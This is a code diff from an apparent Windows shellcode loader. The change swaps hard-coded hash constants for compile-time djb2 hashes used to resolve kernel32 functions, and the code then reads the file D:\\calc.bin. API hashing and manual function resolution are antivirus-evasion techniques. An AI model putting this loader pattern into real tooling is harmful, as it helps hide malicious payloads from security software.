@@ -31,12 +31,18 @@ void myMain()
 
     HMODULE kHandle = (HMODULE)(pDte->DllBase);
 
-    myCreateFileA fnCreateFileA = (myCreateFileA)myGetProcAddress(kHandle, 0x8a90ce6c20b80cc9);
-    myGetFileSize fnGetFileSize = (myGetFileSize)myGetProcAddress(kHandle, 0x8aa47fa8adb30bef);
-    myReadFile fnReadFile = (myReadFile)myGetProcAddress(kHandle, 0x674469f8e250ba50);
-    myCloseHandle fnCloseHandle = (myCloseHandle)myGetProcAddress(kHandle, 0x8a8fdea06d9210d6);
-    myVirtualAlloc fnVirtualAlloc = (myVirtualAlloc)myGetProcAddress(kHandle, 0xe9cf8c2311763046);
-    myVirtualFree fnVirtualFree = (myVirtualFree)myGetProcAddress(kHandle, 0x8af6c62f9bb115fd);
+    constexpr DWORD64 CreateFileAHash = djb2("CreateFileA");
+    constexpr DWORD64 GetFileSizeHash = djb2("GetFileSize");
+    constexpr DWORD64 ReadFileHash = djb2("ReadFile");
+    constexpr DWORD64 CloseHandleHash = djb2("CloseHandle");
+    constexpr DWORD64 VirtualAllocHash = djb2("VirtualAlloc");
+    constexpr DWORD64 VirtualFreeHash = djb2("VirtualFree");
+    myCreateFileA fnCreateFileA = (myCreateFileA)myGetProcAddress(kHandle, CreateFileAHash);
+    myGetFileSize fnGetFileSize = (myGetFileSize)myGetProcAddress(kHandle, GetFileSizeHash);
+    myReadFile fnReadFile = (myReadFile)myGetProcAddress(kHandle, ReadFileHash);
+    myCloseHandle fnCloseHandle = (myCloseHandle)myGetProcAddress(kHandle, CloseHandleHash);
+    myVirtualAlloc fnVirtualAlloc = (myVirtualAlloc)myGetProcAddress(kHandle, VirtualAllocHash);
+    myVirtualFree fnVirtualFree = (myVirtualFree)myGetProcAddress(kHandle, VirtualFreeHash);
 
     char filePath[] = { 'D', ':', '\\', 'c', 'a', 'l', 'c', '.', 'b', 'i', 'n', 0 };
 
